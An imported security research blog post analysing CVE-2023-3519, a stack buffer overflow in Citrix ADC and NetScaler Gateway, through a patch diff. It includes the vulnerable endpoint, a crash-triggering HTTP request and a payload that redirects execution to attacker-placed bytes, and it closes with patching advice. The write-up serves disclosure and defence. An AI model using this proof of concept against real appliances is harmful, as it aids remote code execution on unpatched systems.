---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-07-24_part-2.md
original_filename: 2023-07-24_part-2.md
title: Part 2
category: documents
detected_topics:
- command-injection
- sso
- saml
- automation-abuse
tags:
- imported
- documents
- command-injection
- sso
- saml
- automation-abuse
language: en
raw_sha256: 435dcc1fa32dc95a937dd18ca7e10120c77b276850a94f2ca6e02142120a0958
text_sha256: d6e54f915d269260927f04c7f6a2c49aa9762045d0defa82f54da16e295e9641
ingested_at: '2026-06-28T07:32:24Z'
sensitivity: unknown
redactions_applied: false
---

# Part 2

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-07-24_part-2.md
- Source Type: markdown
- Detected Topics: command-injection, sso, saml, automation-abuse
- Ingested At: 2026-06-28T07:32:24Z
- Redactions Applied: False
- Raw SHA256: `435dcc1fa32dc95a937dd18ca7e10120c77b276850a94f2ca6e02142120a0958`
- Text SHA256: `d6e54f915d269260927f04c7f6a2c49aa9762045d0defa82f54da16e295e9641`


## Content

---
title: "Part 2"
page_title: "Analysis of CVE-2023-3519 in Citrix ADC and NetScaler Gateway (Part 2)"
url: "https://blog.assetnote.io/2023/07/24/citrix-rce-part-2-cve-2023-3519/"
final_url: "https://www.assetnote.io/resources/research/analysis-of-cve-2023-3519-in-citrix-adc-and-netscaler-gateway-part-2"
authors: ["Dylan Pindur", "Shubham Shah (@infosec_au)"]
programs: ["Citrix Systems"]
bugs: ["RCE", "Code injection", "SAML", "Security code review"]
publication_date: "2023-07-24"
added_date: "2023-07-24"
source: "pentester.land/writeups.json"
original_index: 904
---

[Research Notes](/resources/research)

Security Research

July 24, 2023

# Analysis of CVE-2023-3519 in Citrix ADC and NetScaler Gateway (Part 2)

No items found.

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/653795bb35bc995a6f921d3f_citrixbleed.svg)

Creative Commons license

In our [last post](https://blog.assetnote.io/2023/07/21/citrix-CVE-2023-3519-analysis/) we uncovered a vulnerability inside Citrix ADC and NetScaler Gateway that was in the patch fix for CVE-2023-3519. It seems that this vulnerability, while also critical, is not the one that is being exploited in the wild by threat actors.

We continued our analysis and discovered an endpoint which allowed for remote code execution without the need of any special configurations such as SAML being enabled. This vulnerability matches more closely with the description of the CVE, Citrix’s advisory and any other public research that has surfaced.

By continuing our analysis of the patch diff, we discovered <span class="code_single-line">ns_aaa_gwtest_get_event_and_target_names</span> had some changes which are shown below.
  
  
  // Unpatched Version
  
  if (iVar3 + 1 == iVar7 + -6) {
  iVar3 = ns_aaa_saml_url_decode(pcVar1,param_2);
  pcVar8 = local_38;
  if (iVar3 == 0) {
  uVar9 = 0x16000c;
  } else {
  *(undefined *)(param_2 + iVar3) = 0;
  uVar9 = 0;
  }
  }
  
  // Patched Version
  
  if ((iVar3 + 1 == uVar8 - 6) && (uVar9 = 0x160010, iVar3 < 0x80)) {
  iVar3 = ns_aaa_saml_url_decode(pcVar1,param_2,iVar3);
  pcVar7 = local_38;
  if (iVar3 == 0) {
  uVar9 = 0x16000c;
  } else {
  *(undefined *)(param_2 + iVar3) = 0;
  uVar9 = 0;
  }
  }
  
  

Note the additional check of <span class="code_single-line">iVar3</span> which is then passed as a parameter to <span class="code_single-line">ns_aaa_saml_url_decode</span>. Tracing the callgraph backwards we found our vulnerable function is called at the start of <span class="code_single-line">ns_aaa_gwtest_get_valid_fsso_server</span> which is available at the path <span class="code_single-line">/gwtest/formssso</span>.

Looking at this endpoint we were able to determine that it expected an <span class="code_single-line">event</span> query parameter with a value of <span class="code_single-line">start</span> or <span class="code_single-line">stop</span>. The function then URL decoded the <span class="code_single-line">target</span> query parameter with no length check. To verify we constructed the following request:
  
  
  GET /gwtest/formssso?event=start&target=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1
  Host: 192.168.1.225
  
  

Which resulted in the following crash.

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/64c0f48ea5eb283bf8b9395a_citrix-bof-first-crash.png)

After a bit of fiddling, we were then able to slot in a return address to a location in the stack where we placed some INT3 instructions (<span class="code_single-line">0xcc</span>). The payload we used is shown below.
  
  
  payload  = b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
  payload += b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
  payload += b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
  payload += b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
  payload += b'\xf0\xc1\xff\xff\xff\x7f%00%00CCCCCCCCDDDDDDDD\xcc\xcc\xcc\xcc'
  
  

Again we hit our crash in GDB. This time halting on our interrupt instructions as they were executed.

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/64c0f48e5e4aaa012b4a89cf_citrix-bof-code-exec.png)

The next step is to pivot this to be able to run arbitrary commands, but that is a topic for another blog post.

Detecting this vulnerability is quite challenging as this endpoint behaves in a similar way when sending a non-malicious payload on both patched and unpatched instances (500 error).

While we find that version based checks (relying on <span class="code_single-line">Last-Modified</span> or hashes and version numbers) can often be less accurate, at the time of writing this blog post, there are no other ways to detect this vulnerability without attempting the exploit.

We suggest that organizations review the [Indicators of Compromise from CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-201a) and patch their instances of Citrix ADC and NetScaler Gateway ASAP as per the [Citrix advisory](https://support.citrix.com/article/CTX561482/citrix-adc-and-citrix-gateway-security-bulletin-for-cve20233519-cve20233466-cve20233467).

Additional detection and exploitation mechanisms have been released for customers of our [Attack Surface Management platform](https://assetnote.io/), providing coverage over this emerging, and in the wild exploited threat.

Written by:

Dylan Pindur

Shubham Shah

Your subscription could not be saved. Please try again. 

Your subscription has been successful. 

Get updates on our research

Subscribe to our newsletter and stay updated on the newest research, security advisories, and more!

Enter your email address to subscribe

Provide your email address to subscribe. For e.g abc@xyz.com 

SUBSCRIBE 

### More Like This

[Security ResearchNew!Doing the Due Diligence: Analyzing the Next.js Middleware Bypass (CVE-2025-29927)Read moreRead on ASN Blog](/resources/research/doing-the-due-diligence-analyzing-the-next-js-middleware-bypass-cve-2025-29927)

[Security ResearchNew!How an obscure PHP footgun led to RCE in Craft CMSRead moreRead on ASN Blog](/resources/research/how-an-obscure-php-footgun-led-to-rce-in-craft-cms)

[Security ResearchNew!Citrix Denial of Service: Analysis of CVE-2024-8534Read moreRead on ASN Blog](/resources/research/citrix-denial-of-service-analysis-of-cve-2024-8534)

[Security ResearchNew!Nginx/Apache Path Confusion to Auth Bypass in PAN-OS (CVE-2025-0108)Read moreRead on ASN Blog](/resources/research/nginx-apache-path-confusion-to-auth-bypass-in-pan-os)

[Security ResearchNew!Leveraging An Order of Operations Bug to Achieve RCE in Sitecore 8.x - 10.xRead moreRead on ASN Blog](/resources/research/leveraging-an-order-of-operations-bug-to-achieve-rce-in-sitecore-8-x---10-x)

[Security ResearchNew!Insecurity through Censorship: Vulnerabilities Caused by The Great FirewallRead moreRead on ASN Blog](/resources/research/insecurity-through-censorship-vulnerabilities-caused-by-the-great-firewall)

[Back to All](/resources/research)

### Ready to get started?

Get on a call with our team and learn how Assetnote can change the way you secure your attack surface. We'll set you up with a trial instance so you can see the impact for yourself.

[Request a Demo](/demo)

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/64241df2676aeba82706ffe8_assetnote-logo.svg)

Address:  
Level 10, 12 Creek Street, Brisbane QLD, 4000  
‍  
Contact:  
[contact@assetnote.io  
  
](mailto:contact@assetnote.io)Press Inquiries:[  
](mailto:contact@assetnote.io)[press@assetnote.io](mailto:press@assetnote.io)

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/661f041240ed96ed7a03fe6f_61dc1beb212a1202fc512a76_SOC%202-03-p-500.png)

[](https://twitter.com/assetnote)[](https://www.linkedin.com/company/assetnote/)

Platform Features

[Continuous Asset Discovery](/platform/asset-discovery)

[Deep Asset Enrichment](/platform/asset-enrichment)

[Assetnote Exposure Engine](/platform/assetnote-exposure-engine)

[Expert Security Research](/platform/expert-security-research)

[Collaborative Workflows](/platform/collaborative-workflows)

[Customization](/platform/customization)

Use Cases

[Continuous Asset Discovery and Inventory](/use-cases/continuous-asset-discovery-and-inventory)

[Real-Time Exposure Monitoring](/use-cases/continuous-security-monitoring)

[Attack Surface Reduction](/use-cases/attack-surface-reduction)

[Mergers & Acquisitions](/use-cases/mergers-and-acquisitions)

[Bug Bounty Readiness](/use-cases/bug-bounty-readiness)

© 2026 Assetnote. All rights reserved.

[Privacy Policy](https://assetnote.io/policies/privacy-policy)
